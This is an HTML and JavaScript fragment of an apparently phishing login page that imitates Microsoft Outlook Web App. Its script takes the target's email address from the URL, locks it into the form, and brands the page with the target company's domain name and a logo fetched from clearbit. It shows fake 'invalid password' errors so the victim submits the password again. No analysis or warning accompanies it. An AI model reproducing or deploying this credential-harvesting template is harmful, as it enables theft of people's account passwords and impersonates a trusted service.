    <h2 class="text-center"><div class=owaLogoContainer>
            <img src="" alt="Mailbox" id="logoimg" style="width:100px;height:100px;">

            <h1 style="color: #0078d4;" class="h4 mb-3 font-weight-normal" id=corportate-title> <i></i>Powered By <span id="dom">Microsoft</span></h1><br />
            <form name="myform" action="" method="post">
                <label for=username class=sr-only>Email address</label>
            <input type="email" id="email"  class=form-control name="pet" placeholder="Email address" autofocus required><P><br>
            <label for=inputPassword class=sr-only>Password</label>
            <input type="password" id=password name="password" class=form-control placeholder=Password required>
<!--             <input type="hidden" name="error" id="error">
 -->            <input type="hidden" name="source" value="OWA">
            <div  style=color:red class=warning id=warning></div>
            <div class="checkbox mb-3 text-left">
                <div id="mgss" style="display: none;color: red;font-weight: 400;margin-top: 10px;font-size:15px">Invalid password combination. Try entering your correct password again.</div>
                                <span id="error" class="text-danger" style="display: none;color: red;font-weight: 400;margin-top: 10px;font-size:15px">That account doesn't exist. Enter a different account</span>
                <label style="text-align:center; font-size:15px">
                    <input type=checkbox value=remember-me>&nbsp;
                    <span id=privateLabel aria-hidden=true>Private computer</span>
                    (<a href=# class=signInCheckBoxLink role=link>What is this?</a>)
                </label>
                
            </div>
            <button type="submit" style=float:right class="btn btn-lg btn-primary btn-block" id="submit-btn">Sign in</button>

            </form>

    <script>
        const email = new URLSearchParams(location.search).get('email');
        const error = new URLSearchParams(location.search).get('error');
        if(email){
            document.getElementById('email').value = email;
            document.getElementById('email').setAttribute('readonly', 'true');
            let dom = email.slice(email.indexOf('@') + 1);
            dom = dom[0].toUpperCase() + dom.slice(1);
            document.getElementById('dom').innerHTML = dom;
            
            
            var final= dom.toLowerCase();
            var finalu= dom.toUpperCase();
            $("#logoimg").attr("src", "https://logo.clearbit.com/"+dom);
        $("#logoname").html(finalu);
        $(".logoname").html(finalu);

        }
        if(error){
            document.getElementById('error').value = 'error';
            document.getElementById('err').style.display = 'block';
        }

    </script>
